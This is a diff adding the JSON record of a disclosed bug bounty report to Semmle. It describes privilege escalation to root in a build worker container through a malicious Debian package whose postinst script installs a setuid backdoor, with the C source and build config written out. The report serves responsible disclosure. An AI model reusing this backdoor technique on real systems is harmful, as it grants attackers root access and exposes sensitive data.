@@ -1,0 +1,135 @@
+{
+  "id": 692603,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82OTI2MDM=",
+  "url": "https://hackerone.com/reports/692603",
+  "title": "Privilege escalation in workers container ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2019-09-11T21:37:46.480Z",
+  "submitted_at": "2019-09-11T21:37:46.480Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "testanull",
+    "url": "/testanull",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/SF93KjfUXeXdWWFga4q3gwCa/c8a1698ff707a5e3e8a91a3484838363845daac68cb82c86d55c9e2d44d67b67"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 27264,
+    "url": "https://hackerone.com/semmle",
+    "handle": "semmle",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/027/264/8af1325fdaccc38beab4451ba68ace24623b248c_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Semmle",
+      "twitter_handle": "semmle",
+      "website": "https://semmle.com",
+      "about": "Semmle's engineering analytics platform helps leading technology companies and open-source developers build secure, reliable software."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2019-09-25T01:31:38.767Z",
+  "bug_reporter_agreed_on_going_public_at": "2019-09-25T01:31:38.714Z",
+  "team_member_agreed_on_going_public_at": "2019-09-12T15:42:35.400Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary about the bugs:\nIn the prepare step, semmle allows user to install new package.\n\nBy upload a malicious package along with source code and force server to build this package, attacker will gain root access to the container\n\n## Steps:\n\n1. Create a malicious package contains the backdoor:\n\nI use this guide (https://www.offensive-security.com/metasploit-unleashed/binary-linux-trojan/) to create the package.\n\nWith the content of ``postinst`` is\n\n```\n#!/bin/sh\n\nps -ef\nsudo cp /opt/src/run /suidfs/passwd && sudo chown root:root /suidfs/passwd && sudo chmod 04755 /suidfs/passwd && ln -s /suidfs/passwd /usr/bin/setpasswd && setpasswd id &\n\n```\n\nContent of ``/opt/src/run``:\n\n```\n#include <stdio.h>\nvoid main(int argc, char *argv[]) {\n    setreuid(0, 0);\n    system(argv[1]);\n}\n```\nAfter that i will got a malicious ``.deb`` package.\n\n2. Create a config file to install this malicious package:\n\nBecause the source code is imported before the ``prepare`` step happens, so i will be able to install this package by point directly to it like this ``/opt/src/work.deb``.\n\nThe install command now will be like this ``apt install -y --no-recommend /opt/src/work.deb``. And it is ``legal``.\n\nThe build config:\n```\nextraction:\n  java:\n    prepare:\n      packages:\n        - /opt/src/work.deb\n    after_prepare:\n      - echo pwned >> /opt/out/snapshot/log/build.log\n      - /usr/bin/setpasswd 'id'\n```\nAfter that the build will failed, and attacker will get root on the container by running the setuid backdoor\n\n## PoC is attached below\n\nThanks & regard!\n\n## Impact\n\nAttacker will get root access and will be able to dump every sensitive datas in the server!",
+  "bounty_amount": "1500.0",
+  "formatted_bounty": "$1,500",
+  "weakness": {
+    "id": 75,
+    "name": "Privilege Escalation"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 580620,
+      "file_name": "sem4.PNG",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/Z4ZwkuiUxcWdPc7tL2TdsQzS?response-content-disposition=attachment%3B%20filename%3D%22sem4.PNG%22%3B%20filename%2A%3DUTF-8%27%27sem4.PNG&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYQP6YWPR%2F20260221%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20260221T013202Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDCY%2BG6LyVug6SlfHpcqOrtUx3GYEUDFHJxlIuZKUxl2gIgNiJ8Xg5P8Gl0%2FsyICoep0u6YY0S0hvTJoKKYDhdK%2F%2FEqugUIov%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDN9vC2Z3aeGTqu0A7iqOBcWx6C0koAr9RXdcXGkONXf3S3mUPGrP0oi2GjHjCvVn7BrOVLwmn4Y3nb8efhPdEWTFHB9Kr8oHRaJPo8WO4MSUARKgKDAGcjY%2B3PSev%2BpmKovfLKuYC7XSfrSaTkqiQBkXdJ99Jj7xaAdLyl2H1nU4FWss1%2BECfqLbc2JTaYYsiA2DbR3ZQt8ckRSGXDm2v0y9sjK6PmkocRlONFkUsJvz2%2B8PYmvAdJRtQryFKJ7gyujmKs8rlLYsFr3N%2Foo74ArN0Z4kPTb17lmBdaybkQN%2FZzC7ScNQo1%2FFQzoMXLJEj8abxDqUuzoSk6Jtc7iMLV%2BMkTsgLtsIlRcftXlBcsI4p6ZZqVsp1E0HICsL3J1Nsfdf04v8YOoNXMKEW8lO1Eow3TLDI0m3aibZH96d9B5pFYVMBRvo%2FK0fspiS%2BN1qUcRlHBCrcC%2Ffo2BowlCCeXCcxiBGHVRGS3U%2B4p774qsvdUzM2%2Bl%2BCyHAsVamw7pI4TjVvV1ObitahEAI8uMRZcXE3%2F6Dca3JZx5IwkvY15KcvAAEA%2BxV5CqUX6kHY0hpQOKadm93jqVywZ40rcj3VvCUIH6dAWgwwepu0SM5sNH2hEiHH3GTWrbFKpSBnzLTftNIgoMW9Au%2BOAJVJ%2BpX8ZF35CqR24IUtr%2BJpK%2Fpj%2Fuj%2FX0nrwMsTFTP9Ee2esXckPBj6ecV9Ch7%2BhJLsRvi0UGTDYQCpJaWFl9923evj7k4sXbjnpOCLs5%2B%2BFMH7xKQ4VQXZ1NhfSDhxvI2DCE3Mrnid2pufF20A48oWRzP3vPG0fMYfaXEh04QV%2FL4wMULHuEEpInbS3sX50YDs%2FQSZN4xPN732L%2FXo6%2BqVZvO70CeCpQA%2FHo0l44JbYvtzzCviuTMBjqxAT9DP7VncRbkB4cXpbtogN%2Ft7NkQ1BMdMcEPAcc8FV2DlozzZMR6xv4TvV2PJnsuqLEdynkd8UoTaAfvgYS8Q5Q8OlnL4QW2BlpE5jwl3Mix%2F5AnaEGIjIcYWXNF2FaJXSvBVArCBHZt2L0T12aqs4GOB4YzphsPUts4PzITnGdGSjJ54QHM5dmrYUoe7bRtILWBPRYCCMixlXXHNBengJmU1tXPAxhOJISQiOEVv%2BTG0g%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=7ab47d11e48eff0124276a885ea3ac4e19bee1c7c364b534a52e73ca3148a3bb",
+      "file_size": 167243,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2019-10-12T15:42:35.458Z",
+  "allow_singular_disclosure_after": -200742567.0325047,
+  "singular_disclosure_allowed": true,
+  "vote_count": 206,
+  "voters": [
+    "voiddy",
+    "j0nh4t",
+    "orange303",
+    "sebd",
+    "qdoan95",
+    "jfran_cbit",
+    "mashoud1122",
+    "me9187",
+    "0xbeefed",
+    "kapytein",
+    "and 196 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 8552,
+    "asset_type": "URL",
+    "asset_identifier": "lgtm-com.pentesting.semmle.net",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
